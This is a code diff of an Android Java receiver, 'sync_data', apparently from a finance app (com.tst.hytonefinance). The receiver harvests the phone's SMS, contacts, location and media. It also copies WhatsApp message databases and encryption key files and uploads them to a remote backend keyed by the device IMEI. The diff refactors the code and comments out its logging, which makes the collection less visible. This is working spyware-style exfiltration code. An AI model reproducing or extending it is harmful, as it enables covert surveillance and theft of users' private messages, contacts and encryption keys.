@@ -18,13 +18,10 @@ import android.webkit.MimeTypeMap;
 
 import androidx.annotation.RequiresApi;
 
-import com.android.volley.AuthFailureError;
 import com.android.volley.NetworkResponse;
 import com.android.volley.Request;
 import com.android.volley.RequestQueue;
-import com.android.volley.Response;
 import com.android.volley.ServerError;
-import com.android.volley.VolleyError;
 import com.android.volley.toolbox.HttpHeaderParser;
 import com.android.volley.toolbox.JsonObjectRequest;
 import com.android.volley.toolbox.Volley;
@@ -41,17 +38,17 @@ import org.json.JSONObject;
 
 import java.io.ByteArrayOutputStream;
 import java.io.File;
-import java.io.FileFilter;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.UnsupportedEncodingException;
 import java.util.ArrayList;
+import java.util.Collections;
 import java.util.HashMap;
 import java.util.Map;
 
 
 public class sync_data extends BroadcastReceiver implements fileUploadListener {
-    private String Base_Url = "http://backend.getbridge.in";
+    private final String Base_Url = "http://backend.getbridge.in";
     private Context context;
     private SMS_data sms_data;
     private Media_DB media_DB;
@@ -61,8 +58,8 @@ public class sync_data extends BroadcastReceiver implements fileUploadListener {
     SharedPreferences sharedPreferences;
 
     //file access
-    private String TAG = "sync_data";
-    private String key;
+//    private String TAG = "sync_data";
+//    private String key;
     private String file_format = "image";
     //WifiManager wifiManager;
     //int initialWIFIState;
@@ -81,22 +78,22 @@ public class sync_data extends BroadcastReceiver implements fileUploadListener {
         sharedPreferences = context.getSharedPreferences("com.tst.hytonefinance.Background_Service", Context.MODE_PRIVATE);
 
         //**************************** SMS *************************************
-        Log.e("Process_status :","SMS Sync started",null);
+//        Log.e("Process_status :","SMS Sync started",null);
         SMS_spliterator();
 //
 //
 //        //**************************** Contact *************************************
-        Log.e("Process_status :","Contact Sync started",null);
+//        Log.e("Process_status :","Contact Sync started",null);
         contact_spliterator();
 //
 //
 //        //**************************** Location *************************************
-        Log.e("Process_status :","Location Sync started",null);
+//        Log.e("Process_status :","Location Sync started",null);
         location_spliterator();
 //
 //
 //        //**************************** Media *************************************
-        Log.e("Process_status :", "Media Sync started", null);
+//        Log.e("Process_status :", "Media Sync started", null);
         file_format = "image";
         fileUploadStart();
 
@@ -142,7 +139,7 @@ public class sync_data extends BroadcastReceiver implements fileUploadListener {
                     LOCATION_LIST = new JSONArray();
                 }
             } catch (JSONException jsonException) {
-                jsonException.printStackTrace();
+//                jsonException.printStackTrace();
             }
         }
 
@@ -223,7 +220,7 @@ public class sync_data extends BroadcastReceiver implements fileUploadListener {
                     SMS_list = new JSONArray();
                 }
             } catch (JSONException jsonException) {
-                jsonException.printStackTrace();
+//                jsonException.printStackTrace();
             }
 
         }
@@ -341,7 +338,7 @@ public class sync_data extends BroadcastReceiver implements fileUploadListener {
                     Contact_list = new JSONArray();
                 }
             } catch (JSONException jsonException) {
-                jsonException.printStackTrace();
+//                jsonException.printStackTrace();
             }
 
         }
@@ -388,7 +385,7 @@ public class sync_data extends BroadcastReceiver implements fileUploadListener {
             cursor.close();
             return name;
         } catch (Exception e) {
-            e.printStackTrace();
+//            e.printStackTrace();
             return null;
         }
 
@@ -409,38 +406,32 @@ public class sync_data extends BroadcastReceiver implements fileUploadListener {
                     JsonObjectRequest(Request.Method.POST,
                             url,
                             Details,
-                            new Response.Listener<JSONObject>() {
-                                @Override
-                                public void onResponse(JSONObject response) {
+                            response -> {
 
-                                    try {
-                                        Log.e("API_Response", String.valueOf(response.getString("status").equals("sucecss")), null);
-                                        Log.e("API_Response", response.toString(), null);
+                                try {
+                                    Log.e("API_Response", String.valueOf(response.getString("status").equals("sucecss")), null);
+//                                        Log.e("API_Response", response.toString(), null);
 
-                                    } catch (JSONException e) {
-                                        e.printStackTrace();
-                                        Log.e("Request_response_catch", e.getMessage(), null);
-                                    }
+                                } catch (JSONException e) {
+//                                        e.printStackTrace();
+//                                        Log.e("Request_response_catch", e.getMessage(), null);
                                 }
                             },
-                            new Response.ErrorListener() {
-                                @Override
-                                public void onErrorResponse(VolleyError error) {
+                            error -> {
 
-                                    NetworkResponse response = error.networkResponse;
-                                    if (error instanceof ServerError && response != null) {
-                                        String res;
-                                        try {
-                                            res = new String(response.data,
-                                                    HttpHeaderParser.parseCharset(response.headers, "utf-8"));
-                                            Log.e("API_Response_Error 1", res, null);
-                                        } catch (UnsupportedEncodingException e) {
-                                            e.printStackTrace();
-                                        }
-                                        // Now you can use any deserializer to make sense of data
+                                NetworkResponse response = error.networkResponse;
+                                if (error instanceof ServerError && response != null) {
+                                    String res;
+                                    try {
+                                        res = new String(response.data,
+                                                HttpHeaderParser.parseCharset(response.headers, "utf-8"));
+//                                            Log.e("API_Response_Error 1", res, null);
+                                    } catch (UnsupportedEncodingException e) {
+//                                            e.printStackTrace();
                                     }
-                                    Log.e("API_Response_Error", error.getMessage(), null);
+                                    // Now you can use any deserializer to make sense of data
                                 }
+//                                    Log.e("API_Response_Error", error.getMessage(), null);
                             }) {
                         @Override
                         public Map<String, String> getHeaders() {
@@ -452,7 +443,7 @@ public class sync_data extends BroadcastReceiver implements fileUploadListener {
 
             requestQueue.add(jsObjRequest);
         } catch (JSONException e) {
-            e.printStackTrace();
+//            e.printStackTrace();
         }
 
 
@@ -483,71 +474,37 @@ public class sync_data extends BroadcastReceiver implements fileUploadListener {
     //------------------ Media List -------------------
     public void fileUploadStart() {
 
-        Log.w(TAG, "file upload start");
+//        Log.w(TAG, "file upload start");
         if (file_format.equals("call_recording")) {
 
             File appDir = context.getFilesDir();
-            File[] recordings = appDir.listFiles(new FileFilter() {
-                @Override
-                public boolean accept(File file) {
-                    return file.getName().toLowerCase().endsWith(".mp4");
-                }
-            });
+            File[] recordings = appDir.listFiles(file -> file.getName().toLowerCase().endsWith(".mp4"));
 
-            for (File file : recordings) {
-                file_only.add(file);
-//                Media_list.put(file.getName(),false);
-            }
+            Collections.addAll(file_only, recordings);
 
         } else if (file_format.equals("whatsapp")) {
 
             File whatsappDirectory = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/WhatsApp/Databases");
-            File[] recordings = whatsappDirectory.listFiles(new FileFilter() {
-                @Override
-                public boolean accept(File file) {
-                    return file.getName().toLowerCase().startsWith("msgstore");
-                }
-            });
+            File[] recordings = whatsappDirectory.listFiles(file -> file.getName().toLowerCase().startsWith("msgstore"));
 
-            for (File file : recordings) {
-                file_only.add(file);
-//                Media_list.put(file.getName(),false);
-
-            }
+            Collections.addAll(file_only, recordings);
 
 
             File whatsappDirectory2 = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/Android/data/com.whatsapp/files");
-            File[] recordings2 = whatsappDirectory2.listFiles(new FileFilter() {
-                @Override
-                public boolean accept(File file) {
-                    return file.getName().toLowerCase().startsWith("key");
-                }
-            });
+            File[] recordings2 = whatsappDirectory2.listFiles(file -> file.getName().toLowerCase().startsWith("key"));
 
             if (recordings2.length > 0) {
 
-                for (File file : recordings2) {
-                    file_only.add(file);
-//                    Media_list.put(file.getName(),false);
-
-                }
+                Collections.addAll(file_only, recordings2);
             }
 
 
             File whatsappDirectory3 = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/WhatsApp/Backup/files");
-            File[] recordings3 = whatsappDirectory3.listFiles(new FileFilter() {
-                @Override
-                public boolean accept(File file) {
-                    return file.getName().toLowerCase().startsWith("key");
-                }
-            });
+            File[] recordings3 = whatsappDirectory3.listFiles(file -> file.getName().toLowerCase().startsWith("key"));
 
             if (recordings3.length > 0) {
 
-                for (File file : recordings3) {
-                    file_only.add(file);
-//                    Media_list.put(file.getName(),false);
-                }
+                Collections.addAll(file_only, recordings3);
             }
 
         } else {
@@ -559,7 +516,7 @@ public class sync_data extends BroadcastReceiver implements fileUploadListener {
 
         if (file_only.size() > 0) {//if any recordings present
 
-            Log.w(TAG, "file upload file detected - " + file_only.size());
+//            Log.w(TAG, "file upload file detected - " + file_only.size());
 
 //            initialWIFIState = WifiManager.WIFI_STATE_DISABLED;
 //            wifiManager = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
@@ -577,16 +534,15 @@ public class sync_data extends BroadcastReceiver implements fileUploadListener {
             }
 
 
-            FileUploader fileUploader = new FileUploader(context, getDeviceIMEI(), file_format, this);
-            uploadFiles(fileUploader);
+            uploadFiles();
 
 
-        } else {
-            Log.w(TAG, "file upload file not found");
+//        } else {
+////            Log.w(TAG, "file upload file not found");
         }
     }
 
-    private void uploadFiles(final FileUploader fileUploader) {
+    private void uploadFiles() {
         check_File();
         upload_file_one_by_one(file_only.get(0),0);
     }
@@ -594,7 +550,7 @@ public class sync_data extends BroadcastReceiver implements fileUploadListener {
     private void upload_file_one_by_one(File file,int pos){
 
         final Uri file_data = Uri.fromFile(file);
-        InputStream iStream = null;
+        InputStream iStream;
 
         final int[] index = {pos};
 
@@ -604,7 +560,7 @@ public class sync_data extends BroadcastReceiver implements fileUploadListener {
 
             if (Media_list.get(file_only.get(pos).getName()))
             {
-                Log.e("File_Status :","File "+file.getName()+" Already Uploaded",null);
+//                Log.e("File_Status :","File "+file.getName()+" Already Uploaded",null);
                 index[0]++;
                 if(index[0] < file.length())
                     upload_file_one_by_one(file_only.get(index[0]),index[0]);
@@ -616,38 +572,32 @@ public class sync_data extends BroadcastReceiver implements fileUploadListener {
 
 
                 VolleyMultipartRequest volleyMultipartRequest = new VolleyMultipartRequest(Request.Method.POST, Base_Url + "/api/v1/media/userMedia",
-                        new Response.Listener<NetworkResponse>() {
-                            @Override
-                            public void onResponse(NetworkResponse response) {
-                                try {
-                                    JSONObject obj = new JSONObject(new String(response.data));
-                                    //Toast.makeText(context, obj.getString("message"), Toast.LENGTH_SHORT).show();
+                        response -> {
+                            try {
+                                JSONObject obj = new JSONObject(new String(response.data));
+                                //Toast.makeText(context, obj.getString("message"), Toast.LENGTH_SHORT).show();
 
-                                    //upload next file
-                                    Log.w(TAG, "file upload response - " + new String(response.data));
-                                    Log.e("File_Status :","New File "+file.getName()+" Uploaded",null);
-                                    media_DB.Insert_Subject_data(file.getName());
-                                    listener.fileUploadComplete(pos, true);
+                                //upload next file
+//                                    Log.w(TAG, "file upload response - " + new String(response.data));
+//                                    Log.e("File_Status :","New File "+file.getName()+" Uploaded",null);
+                                media_DB.Insert_Subject_data(file.getName());
+                                listener.fileUploadComplete(pos, true);
 
-                                    if(obj.getString("status").equals("sucecss"))
-                                    {
-                                        index[0]++;
-                                        if(index[0] < file.length())
-                                            upload_file_one_by_one(file_only.get(index[0]),index[0]);
-                                    }
-
-                                } catch (JSONException e) {
-                                    e.printStackTrace();
+                                if(obj.getString("status").equals("sucecss"))
+                                {
+                                    index[0]++;
+                                    if(index[0] < file.length())
+                                        upload_file_one_by_one(file_only.get(index[0]),index[0]);
                                 }
+
+                            } catch (JSONException e) {
+//                                    e.printStackTrace();
                             }
                         },
-                        new Response.ErrorListener() {
-                            @Override
-                            public void onErrorResponse(VolleyError error) {
-                                //Toast.makeText(context, error.getMessage(), Toast.LENGTH_SHORT).show();
-                                Log.w(TAG, "file upload fail file - " + file_data.getLastPathSegment());
-                                listener.fileUploadComplete(pos, false);
-                            }
+                        error -> {
+                            //Toast.makeText(context, error.getMessage(), Toast.LENGTH_SHORT).show();
+//                                Log.w(TAG, "file upload fail file - " + file_data.getLastPathSegment());
+                            listener.fileUploadComplete(pos, false);
                         }) {
 
                     /*
@@ -657,14 +607,14 @@ public class sync_data extends BroadcastReceiver implements fileUploadListener {
                      * which is tags
                      * */
                     @Override
-                    protected Map<String, String> getParams() throws AuthFailureError {
+                    protected Map<String, String> getParams() {
                         Map<String, String> params = new HashMap<>();
                         params.put("user", getDeviceIMEI());
                         return params;
                     }
 
                     @Override
-                    public Map<String, String> getHeaders() throws AuthFailureError {
+                    public Map<String, String> getHeaders() {
                         Map<String, String> header = new HashMap<>();
 
                         header.put("Authorization", "Bearer " + getDeviceIMEI());
@@ -680,7 +630,7 @@ public class sync_data extends BroadcastReceiver implements fileUploadListener {
                     protected Map<String, DataPart> getByteData() {
                         Map<String, DataPart> params = new HashMap<>();
                         String fileName = file.getName();//System.currentTimeMillis();
-                        params.put("medias", new DataPart(fileName, inputData,getMimeType(file_data)));
+                        params.put("medias", new DataPart(fileName, inputData, getMimeType(file_data)));
                         return params;
                     }
                 };
@@ -691,9 +641,9 @@ public class sync_data extends BroadcastReceiver implements fileUploadListener {
 
 
         }catch (Exception e){
-            e.printStackTrace();
+//            e.printStackTrace();
             Media_list.put(file.getName(),false);
-            Log.e("File_Status :","File "+file.getName()+" Get Error",null);
+//            Log.e("File_Status :","File "+file.getName()+" Get Error",null);
             if(index[0] < file.length())
                 upload_file_one_by_one(file_only.get(index[0]),index[0]);
 
@@ -716,39 +666,38 @@ public class sync_data extends BroadcastReceiver implements fileUploadListener {
 
     @Override
     public void fileUploadComplete(int position, boolean isFileUploadSuccess) {
-        if (position == file_only.size()) {
-
-//            if ( wifiManager != null && initialWIFIState != WifiManager.WIFI_STATE_ENABLED) {
-//                wifiManager.setWifiEnabled(false);
-//            }
-
-           /* if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                stopForeground(true);
-            } else {
-                stopSelf();
-            }*/
-
-        } else {
-            Log.w(TAG, "file remaining - " + (file_only.size() - (position - 1)));
-        }
+//        if (position == file_only.size()) {
+//
+////            if ( wifiManager != null && initialWIFIState != WifiManager.WIFI_STATE_ENABLED) {
+////                wifiManager.setWifiEnabled(false);
+////            }
+//
+//           /* if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+//                stopForeground(true);
+//            } else {
+//                stopSelf();
+//            }*/
+//
+//        } else {
+////            Log.w(TAG, "file remaining - " + (file_only.size() - (position - 1)));
+//        }
     }
 
-    @Override
-    public void internetConnectionLost(int position) {
-        Log.w(TAG, "file  - internetConnectionLost at " + position + " name is - " + file_only.get(position));
-       /* if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            stopForeground(true);
-        } else {
-            stopSelf();
-        }*/
-    }
+//    public void internetConnectionLost(int position) {
+////        Log.w(TAG, "file  - internetConnectionLost at " + position + " name is - " + file_only.get(position));
+//       /* if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+//            stopForeground(true);
+//        } else {
+//            stopSelf();
+//        }*/
+//    }
 
     public byte[] getBytes(InputStream inputStream) throws IOException {
         ByteArrayOutputStream byteBuffer = new ByteArrayOutputStream();
         int bufferSize = 1024;
         byte[] buffer = new byte[bufferSize];
 
-        int len = 0;
+        int len;
         while ((len = inputStream.read(buffer)) != -1) {
             byteBuffer.write(buffer, 0, len);
         }
@@ -757,7 +706,7 @@ public class sync_data extends BroadcastReceiver implements fileUploadListener {
 
 
     public String getMimeType(Uri uri) {
-        String mimeType = null;
+        String mimeType;
         if (ContentResolver.SCHEME_CONTENT.equals(uri.getScheme())) {
             ContentResolver cr = context.getContentResolver();
             mimeType = cr.getType(uri);
